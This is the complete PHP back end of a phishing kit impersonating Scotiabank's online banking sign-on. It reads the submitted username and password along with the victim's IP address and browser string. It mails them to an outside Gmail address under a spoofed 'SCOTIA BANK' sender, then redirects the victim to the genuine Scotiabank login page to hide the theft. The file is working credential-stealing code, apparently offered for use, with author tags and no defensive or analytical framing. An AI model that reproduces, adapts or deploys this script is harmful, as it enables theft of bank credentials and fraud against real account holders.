<?php
	
$ip = getenv("REMOTE_ADDR");
$browser = getenv ("HTTP_USER_AGENT");
$message .= "-------------------| Itry |-------------------\n";
$message .= "User    :    ".$_POST['signon_form:userName']."\n";
$message .= "Password  :    ".$_POST['signon_form:password_0']."\n";
$message .= "------------------------------------------------------------------\n";
$message .= "IP Address : ".$ip."\n";
$message .= "Browser : ".$browser."\n";
$message .= "--------------------+ |By Sy.simoo|+--------------------\n";
$message .= "+-----/!\-----|By Sy.simoo|-----/!\-----+\n";
$to = "free.rzlt@gmail.com";
$subj = " SCOTIA Sy.simoo Rezults |" .$ip."\n";
$from = "From: SCOTIA BANK    <scotiaa@mail.com>";
mail($to, $subj, $message, $from);
	header("Location: https://www2.scotiaonline.scotiabank.com/online/authentication/authentication.bns");
?>